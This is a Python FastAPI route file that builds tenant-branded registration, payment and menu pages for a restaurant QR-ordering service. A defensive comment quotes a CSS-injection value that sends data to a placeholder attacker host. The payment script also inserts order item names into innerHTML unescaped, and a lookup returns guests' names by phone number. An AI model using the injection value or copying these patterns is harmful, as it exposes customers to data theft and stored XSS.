"""
routes/customer_pages.py
Customer-facing pages — fully branded per client.
  GET /r/{slug}?table=T1&secret=ABC   → Registration page
  GET /menu/{slug}?t=T1&p=91xx&k=tok → Menu page
"""
import html
import os
import re
from fastapi import APIRouter
from fastapi.responses import HTMLResponse
from app.models.database import MasterSession, Client

router = APIRouter()

# Default brand color used whenever a tenant supplies no value, an empty
# value, or one that fails strict validation. The exact shade matches the
# previous baked-in default so visual regressions are minimal.
_DEFAULT_PRIMARY_COLOR = "#ff6b35"
# 6-digit hex color, with the leading #. Anything else (CSS expressions,
# `red;}body{...}`, etc.) is rejected and replaced with the default. This
# closes the CSS-injection / data-exfiltration vector from the previous
# review (L9): a malicious owner could otherwise insert `red;}body{
# background:url(//attacker/?x=}` into a `<style>` block.
_HEX_COLOR_RE = re.compile(r"^#[0-9a-fA-F]{6}$")
# Restrict logo / banner URLs to absolute http(s) URLs so a malicious owner
# can't smuggle a `javascript:` URL into the page (which would then run
# inside the customer's WhatsApp browser session).
_HTTP_URL_RE = re.compile(r"^https?://[^\s\"'<>]+$", re.IGNORECASE)


def _safe_color(value: str | None) -> str:
    v = (value or "").strip()
    return v if _HEX_COLOR_RE.match(v) else _DEFAULT_PRIMARY_COLOR


def _safe_url(value: str | None) -> str:
    v = (value or "").strip()
    return v if _HTTP_URL_RE.match(v) else ""


def _get_client(slug: str) -> Client | None:
    db = MasterSession()
    try:
        return db.query(Client).filter(Client.slug == slug, Client.active == True).first()
    finally:
        db.close()


def _css_vars(color: str) -> str:
    return f"--accent:{color};--accent2:{color}cc;--accent-light:{color}22;"


@router.get("/r/{slug}", response_class=HTMLResponse)
async def registration_page(slug: str):
    c = _get_client(slug)
    # All user-supplied strings are HTML-escaped before being interpolated
    # into the template. Without this, a malicious owner (or a super admin
    # who copy-pasted a poisoned brand string) could inject `<script>` tags
    # via `restaurant_name`, `welcome_message`, etc., resulting in stored XSS
    # in every customer's browser when they scan a QR code.
    name     = html.escape((c.restaurant_name if c else "Restaurant") or "Restaurant")
    color    = _safe_color(c.primary_color if c else None)
    logo     = _safe_url(c.logo_url if c else "")
    welcome  = html.escape((c.welcome_message if c else "Welcome! Scan & Order") or "Welcome! Scan & Order")
    banner   = _safe_url(c.banner_image if c else "")
    # `slug` comes from the URL path — FastAPI already constrained it but
    # we still escape it for the JS embed below.
    slug_safe = html.escape(slug, quote=True)

    logo_html = (
        f'<img src="{logo}" alt="{name}" style="height:60px;object-fit:contain;margin-bottom:8px;border-radius:10px">'
        if logo else
        f'<div style="font-family:Syne,sans-serif;font-size:28px;font-weight:800;color:{color}">{name}</div>'
    )
    banner_html = (
        f'<img src="{banner}" alt="banner" style="width:100%;height:140px;object-fit:cover;border-radius:16px 16px 0 0">'
        if banner else ""
    )

    return HTMLResponse(f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
<title>{name} — Scan & Order</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet">
<style>
  :root {{ {_css_vars(color)} }}
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{font-family:'DM Sans',sans-serif;background:#0a0a0f;color:#f0f0f5;min-height:100vh;
    display:flex;align-items:center;justify-content:center;padding:20px;
    background:radial-gradient(ellipse at 50% 0%,{color}15 0%,#0a0a0f 70%)}}
  .card{{background:#13131a;border:1px solid #2a2a38;border-radius:20px;width:100%;
    max-width:400px;overflow:hidden;box-shadow:0 0 60px {color}18}}
  .card-body{{padding:28px 28px 32px}}
  .logo-area{{text-align:center;margin-bottom:6px}}
  .restro-name{{font-family:'Syne',sans-serif;font-size:22px;font-weight:800;color:{color};text-align:center;margin-bottom:4px}}
  .welcome{{text-align:center;color:#8888a0;font-size:13px;margin-bottom:24px}}
  .table-badge{{background:{color}18;border:1px solid {color}44;color:{color};border-radius:12px;
    padding:10px 16px;font-size:14px;font-weight:600;text-align:center;margin-bottom:20px;display:none}}
  label{{display:block;font-size:12px;color:#8888a0;margin-bottom:6px;font-weight:500}}
  input{{width:100%;background:#1c1c26;border:1px solid #2a2a38;border-radius:12px;
    padding:13px 16px;color:#f0f0f5;font-size:15px;font-family:'DM Sans',sans-serif;
    outline:none;margin-bottom:16px;transition:border-color 0.2s}}
  input:focus{{border-color:{color}}}
  .btn{{width:100%;background:linear-gradient(135deg,{color},{color}aa);border:none;
    border-radius:12px;padding:14px;color:white;font-size:15px;font-weight:600;
    font-family:'DM Sans',sans-serif;cursor:pointer;transition:opacity 0.2s}}
  .btn:hover{{opacity:0.9}}
  .btn:disabled{{opacity:0.5;cursor:not-allowed}}
  .msg{{border-radius:10px;padding:12px 16px;font-size:14px;margin-top:14px;text-align:center;display:none}}
  .msg.success{{background:#06d6a018;border:1px solid #06d6a044;color:#06d6a0}}
  .msg.error{{background:#ef444418;border:1px solid #ef444444;color:#f87171}}
  .note{{text-align:center;font-size:12px;color:#8888a0;margin-top:16px}}
  hr{{border:none;border-top:1px solid #2a2a38;margin:18px 0}}
</style>
</head>
<body>
<div class="card">
  {banner_html}
  <div class="card-body">
    <div class="logo-area">{logo_html}</div>
    <div class="restro-name">{name}</div>
    <div class="welcome">{welcome}</div>
    <div class="table-badge" id="table-badge">🪑 Table: <span id="table-display"></span></div>
    <input type="hidden" id="table-val">
    <input type="hidden" id="secret-val">
    <div>
      <label>Your Name</label>
      <input type="text" id="inp-name" placeholder="Enter your full name" maxlength="30">
      <label>WhatsApp Number</label>
      <input type="tel" id="inp-phone" placeholder="91XXXXXXXXXX (with country code)" maxlength="15">
      <div id="welcome-back" style="display:none;background:{color}18;border:1px solid {color}44;color:{color};border-radius:10px;padding:10px 14px;font-size:13px;margin-bottom:14px;text-align:center"></div>
      <button class="btn" id="reg-btn" onclick="register()">Send Request →</button>
      <div class="msg" id="msg"></div>
    </div>
    <hr>
    <div class="note">Staff will approve your request on WhatsApp 🙏</div>
  </div>
</div>
<script>
  const BASE=window.location.origin, SLUG='{slug_safe}';
  const params=new URLSearchParams(window.location.search);
  const table=params.get('table')||'', secret=params.get('secret')||'';
  if(table){{
    document.getElementById('table-badge').style.display='block';
    document.getElementById('table-display').textContent=table;
    document.getElementById('table-val').value=table;
    document.getElementById('secret-val').value=secret;
  }}
  async function register(){{
    const name=document.getElementById('inp-name').value.trim();
    const phone=document.getElementById('inp-phone').value.trim();
    const table=document.getElementById('table-val').value;
    const secret=document.getElementById('secret-val').value;
    const btn=document.getElementById('reg-btn');
    if(!name||name.length<2){{showMsg('Please enter your name','error');return}}
    if(!phone||phone.length<10){{showMsg('Enter valid WhatsApp number with country code','error');return}}
    if(!table){{showMsg('Invalid QR code. Please scan again.','error');return}}
    btn.disabled=true;btn.textContent='Sending...';
    try{{
      const r=await fetch(BASE+'/webhook/'+SLUG+'/register',{{
        method:'POST',headers:{{'Content-Type':'application/json'}},
        body:JSON.stringify({{phone,name,table,secret}})
      }});
      const d=await r.json();
      if(d.success){{showMsg('✅ '+d.message,'success');btn.textContent='Request Sent!'}}
      else{{showMsg('❌ '+d.error,'error');btn.disabled=false;btn.textContent='Send Request →'}}
    }}catch(e){{showMsg('Network error. Try again.','error');btn.disabled=false;btn.textContent='Send Request →'}}
  }}
  function showMsg(text,type){{
    const el=document.getElementById('msg');
    el.textContent=text;el.className='msg '+type;el.style.display='block';
  }}
  document.getElementById('inp-phone').addEventListener('keydown',e=>{{if(e.key==='Enter')register()}});

  // ── Returning-customer auto-fill ──────────────────────────────────────
  // When the phone number reaches 10+ digits, ping the server. If the guest has
  // visited before, pre-fill the name field and show a friendly "Welcome back!"
  let _lookupTimer=null, _lastLookup='';
  document.getElementById('inp-phone').addEventListener('input', function() {{
    const phone=this.value.trim().replace(/\\D/g,'');
    if(phone.length<10 || phone===_lastLookup) return;
    clearTimeout(_lookupTimer);
    _lookupTimer=setTimeout(async()=>{{
      _lastLookup=phone;
      try{{
        const r=await fetch(BASE+'/webhook/'+SLUG+'/lookup-customer?phone='+encodeURIComponent(phone));
        const d=await r.json();
        const wb=document.getElementById('welcome-back');
        const ni=document.getElementById('inp-name');
        if(d && d.found && d.name){{
          if(!ni.value || ni.value.trim().length<2) ni.value=d.name;
          wb.textContent='👋 Welcome back, '+d.name+'! ('+d.visits+' visits)';
          wb.style.display='block';
        }} else {{
          wb.style.display='none';
        }}
      }}catch(e){{ /* silent */ }}
    }}, 350);
  }});
</script>
</body>
</html>""")


@router.get("/pay/{slug}", response_class=HTMLResponse)
async def payment_page(slug: str):
    """Customer-facing payment page. Query params: phone, table, token."""
    c = _get_client(slug)
    name = html.escape((c.restaurant_name if c else "Restaurant") or "Restaurant")
    color = _safe_color(c.primary_color if c else None)
    logo = _safe_url(c.logo_url if c else "")
    slug_safe = html.escape(slug, quote=True)

    logo_html = (
        f'<img src="{logo}" alt="{name}" style="height:60px;object-fit:contain;margin-bottom:8px;border-radius:10px">'
        if logo else
        f'<div style="font-family:Syne,sans-serif;font-size:28px;font-weight:800;color:{color}">{name}</div>'
    )

    return HTMLResponse(f"""<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0">
<title>{name} - Payment</title>
<link href="https://fonts.googleapis.com/css2?family=Syne:wght@700;800&family=DM+Sans:wght@400;500&display=swap" rel="stylesheet">
<script src="https://checkout.razorpay.com/v1/checkout.js"></script>
<style>
  :root {{ {_css_vars(color)} }}
  *{{margin:0;padding:0;box-sizing:border-box}}
  body{{font-family:'DM Sans',sans-serif;background:#0a0a0f;color:#f0f0f5;min-height:100vh;
    display:flex;align-items:center;justify-content:center;padding:20px;
    background:radial-gradient(ellipse at 50% 0%,{color}15 0%,#0a0a0f 70%)}}
  .card{{background:#13131a;border:1px solid #2a2a38;border-radius:20px;width:100%;
    max-width:440px;overflow:hidden;box-shadow:0 0 60px {color}18}}
  .card-body{{padding:28px 28px 32px}}
  .logo-area{{text-align:center;margin-bottom:6px}}
  .restro-name{{font-family:'Syne',sans-serif;font-size:22px;font-weight:800;color:{color};text-align:center;margin-bottom:4px}}
  .subtitle{{text-align:center;color:#8888a0;font-size:13px;margin-bottom:20px}}
  .order-summary{{background:#1c1c26;border:1px solid #2a2a38;border-radius:12px;padding:16px;margin-bottom:20px}}
  .order-summary h3{{font-size:14px;color:{color};margin-bottom:10px}}
  .order-item{{display:flex;justify-content:space-between;font-size:13px;padding:4px 0;color:#ccc}}
  .order-totals{{border-top:1px solid #2a2a38;margin-top:10px;padding-top:10px}}
  .order-totals .row{{display:flex;justify-content:space-between;font-size:13px;padding:3px 0;color:#aaa}}
  .order-totals .row.total{{font-size:16px;font-weight:700;color:#f0f0f5}}
  .tabs{{display:flex;gap:8px;margin-bottom:16px}}
  .tab{{flex:1;padding:10px;border-radius:10px;border:1px solid #2a2a38;background:#1c1c26;color:#8888a0;
    font-size:13px;font-weight:500;cursor:pointer;text-align:center;transition:all 0.2s}}
  .tab.active{{background:{color}22;border-color:{color};color:{color}}}
  .payment-section{{display:none}}
  .payment-section.active{{display:block}}
  .btn{{width:100%;background:linear-gradient(135deg,{color},{color}aa);border:none;
    border-radius:12px;padding:14px;color:white;font-size:15px;font-weight:600;
    font-family:'DM Sans',sans-serif;cursor:pointer;transition:opacity 0.2s}}
  .btn:hover{{opacity:0.9}}
  .btn:disabled{{opacity:0.5;cursor:not-allowed}}
  .qr-container{{text-align:center;padding:16px}}
  .qr-container img{{max-width:280px;border-radius:12px;background:#fff;padding:12px}}
  .qr-note{{font-size:12px;color:#8888a0;margin-top:12px;text-align:center}}
  .msg{{border-radius:10px;padding:12px 16px;font-size:14px;margin-top:14px;text-align:center;display:none}}
  .msg.success{{background:#06d6a018;border:1px solid #06d6a044;color:#06d6a0}}
  .msg.error{{background:#ef444418;border:1px solid #ef444444;color:#f87171}}
  .loading{{text-align:center;padding:40px;color:#8888a0}}
  .upi-id-display{{font-size:12px;color:#8888a0;text-align:center;margin-top:8px}}
</style>
</head>
<body>
<div class="card">
  <div class="card-body">
    <div class="logo-area">{logo_html}</div>
    <div class="restro-name">{name}</div>
    <div class="subtitle">Complete your payment</div>
    <div id="loading" class="loading">Loading order details...</div>
    <div id="content" style="display:none">
      <div class="order-summary" id="order-summary"></div>
      <div class="tabs" id="tabs"></div>
      <div id="razorpay-section" class="payment-section">
        <button class="btn" id="pay-btn" onclick="payRazorpay()">Pay Online</button>
      </div>
      <div id="upi-section" class="payment-section">
        <div class="qr-container" id="qr-container"></div>
        <div class="qr-note">Scan this QR code with any UPI app to pay.<br>After payment, your order will be confirmed by staff.</div>
      </div>
      <div class="msg" id="msg"></div>
    </div>
  </div>
</div>
<script>
const BASE=window.location.origin, SLUG='{slug_safe}';
const params=new URLSearchParams(window.location.search);
const phone=params.get('phone')||'', table=params.get('table')||'', token=params.get('token')||'';
let paymentInfo=null;

async function init(){{
  if(!phone||!table||!token){{
    document.getElementById('loading').textContent='Invalid payment link. Missing parameters.';
    return;
  }}
  try{{
    const r=await fetch(BASE+'/webhook/'+SLUG+'/get-payment-info?phone='+encodeURIComponent(phone)+'&table='+encodeURIComponent(table)+'&token='+encodeURIComponent(token));
    const d=await r.json();
    if(!d.success){{
      document.getElementById('loading').textContent=d.error||'Failed to load payment info.';
      return;
    }}
    paymentInfo=d;
    renderOrder(d);
    renderTabs(d.payment_methods);
    document.getElementById('loading').style.display='none';
    document.getElementById('content').style.display='block';
  }}catch(e){{
    document.getElementById('loading').textContent='Network error. Please try again.';
  }}
}}

function renderOrder(d){{
  const s=d.order_summary;
  let html='<h3>Order Summary</h3>';
  (s.items||[]).forEach(function(it){{
    html+='<div class="order-item"><span>'+it.qty+'x '+it.name+'</span><span>Rs.'+it.amount.toFixed(0)+'</span></div>';
  }});
  html+='<div class="order-totals">';
  html+='<div class="row"><span>Subtotal</span><span>Rs.'+s.subtotal.toFixed(0)+'</span></div>';
  html+='<div class="row"><span>Tax</span><span>Rs.'+s.tax.toFixed(0)+'</span></div>';
  html+='<div class="row total"><span>Total</span><span>Rs.'+s.total.toFixed(0)+'</span></div>';
  html+='</div>';
  document.getElementById('order-summary').innerHTML=html;
}}

function renderTabs(methods){{
  const tabsEl=document.getElementById('tabs');
  if(methods.length<=1){{
    tabsEl.style.display='none';
    if(methods[0]==='razorpay'){{showSection('razorpay')}}
    else{{showSection('upi')}}
    return;
  }}
  let html='';
  methods.forEach(function(m,i){{
    const label=m==='razorpay'?'Pay Online':'UPI QR';
    html+='<div class="tab'+(i===0?' active':'')+'" onclick="switchTab(this,\\''+m+'\\')">'+label+'</div>';
  }});
  tabsEl.innerHTML=html;
  showSection(methods[0]==='razorpay'?'razorpay':'upi');
}}

function switchTab(el,method){{
  document.querySelectorAll('.tab').forEach(function(t){{t.classList.remove('active')}});
  el.classList.add('active');
  showSection(method==='razorpay'?'razorpay':'upi');
}}

function showSection(name){{
  document.querySelectorAll('.payment-section').forEach(function(s){{s.classList.remove('active')}});
  document.getElementById(name+'-section').classList.add('active');
  if(name==='upi'&&paymentInfo&&paymentInfo.upi_qr_url){{
    const c=document.getElementById('qr-container');
    c.innerHTML='<img src="'+paymentInfo.upi_qr_url+'" alt="UPI QR Code">';
    if(paymentInfo.upi_id){{
      c.innerHTML+='<div class="upi-id-display">UPI ID: '+paymentInfo.upi_id+'</div>';
    }}
  }}
}}

async function payRazorpay(){{
  const btn=document.getElementById('pay-btn');
  btn.disabled=true;btn.textContent='Processing...';
  try{{
    const r=await fetch(BASE+'/webhook/'+SLUG+'/create-razorpay-order',{{
      method:'POST',headers:{{'Content-Type':'application/json'}},
      body:JSON.stringify({{phone:phone,table:table,token:token}})
    }});
    const d=await r.json();
    if(!d.success){{showMsg(d.error||'Failed to create order','error');btn.disabled=false;btn.textContent='Pay Online';return;}}
    const options={{
      key:d.key_id,
      amount:d.amount,
      currency:d.currency,
      name:d.name,
      description:d.description,
      order_id:d.order_id,
      handler:async function(response){{
        btn.textContent='Verifying...';
        const vr=await fetch(BASE+'/webhook/'+SLUG+'/verify-razorpay-payment',{{
          method:'POST',headers:{{'Content-Type':'application/json'}},
          body:JSON.stringify({{
            phone:phone,table:table,token:token,
            razorpay_order_id:response.razorpay_order_id,
            razorpay_payment_id:response.razorpay_payment_id,
            razorpay_signature:response.razorpay_signature
          }})
        }});
        const vd=await vr.json();
        if(vd.success){{showMsg('Payment confirmed! Your order is being prepared.','success');btn.style.display='none';}}
        else{{showMsg(vd.error||'Payment verification failed.','error');btn.disabled=false;btn.textContent='Pay Online';}}
      }},
      modal:{{ondismiss:function(){{btn.disabled=false;btn.textContent='Pay Online'}}}}
    }};
    const rzp=new Razorpay(options);
    rzp.open();
  }}catch(e){{showMsg('Network error. Please try again.','error');btn.disabled=false;btn.textContent='Pay Online';}}
}}

function showMsg(text,type){{
  const el=document.getElementById('msg');
  el.textContent=text;el.className='msg '+type;el.style.display='block';
}}

init();
</script>
</body>
</html>""")


@router.get("/menu/{slug}", response_class=HTMLResponse)
async def menu_page(slug: str):
    c = _get_client(slug)
    # Same escaping/validation as registration_page — the menu template is
    # rendered with raw string substitution, so we have to make every brand
    # value either HTML-safe (for text contexts) or strictly validated (for
    # color/url attribute contexts).
    name    = html.escape((c.restaurant_name if c else "Restaurant") or "Restaurant")
    color   = _safe_color(c.primary_color if c else None)
    logo    = _safe_url(c.logo_url if c else "")
    welcome = html.escape((c.welcome_message if c else "") or "")
    slug_safe = html.escape(slug, quote=True)

    logo_html = (
        f'<img src="{logo}" alt="{name}" style="height:40px;object-fit:contain;border-radius:8px">'
        if logo else
        f'<span style="font-family:Syne,sans-serif;font-size:18px;font-weight:800;color:{color}">{name}</span>'
    )

    # Read the menu HTML template and inject branding
    path = os.path.join(os.path.dirname(__file__), "..", "..", "static", "menu.html")
    try:
        # Always read as UTF-8 — the template contains ₹, emoji and other
        # non-ASCII content that breaks on platforms whose default encoding
        # isn't UTF-8 (Windows cp1252, certain CI runners, etc.).
        with open(path, encoding="utf-8") as f:
            content = f.read()
        content = (content
            .replace("__SLUG__", slug_safe)
            .replace("__RESTRO_NAME__", name)
            .replace("__COLOR__", color)
            .replace("__LOGO_HTML__", logo_html)
            .replace("__WELCOME__", welcome)
            .replace("#ff6b35", color))
        return HTMLResponse(content)
    except FileNotFoundError:
        return HTMLResponse(f"<h2>{name} Menu</h2><p>Menu page coming soon.</p>")
